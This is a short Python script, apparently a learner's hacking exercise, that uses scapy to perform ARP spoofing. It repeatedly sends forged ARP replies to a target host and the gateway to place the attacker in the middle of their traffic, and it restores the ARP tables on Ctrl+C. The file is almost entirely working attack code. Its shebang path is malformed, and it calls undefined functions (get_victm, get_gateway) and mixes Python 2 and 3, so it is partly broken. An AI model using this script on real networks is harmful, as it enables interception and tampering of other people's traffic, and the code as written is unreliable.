#!/bin/usr/env python
import sys

#this is a ARP Spoofing program for python 2.7

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_brodcast = brodcast/arp_request
    answered_list = scapy.srp(arp_request_brodcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #making a ARP request packet
    scapy.send(packet, verbose=False) #sending out the packet to the network

def restore(destination_ip, source_ip): #function to restore the ARP tables back to normal
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False) #count=4 sends the packet 4 times

target_ip = ""
gateway_ip = ""

get_victm(target_ip)
get_gateway(gateway_ip)
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")# end="" makes it print on the same line
        sys.stdout.flush() #tells to print instantly and not wait till program ends
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ....... Resetting ARP tales...... Please wit.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip )
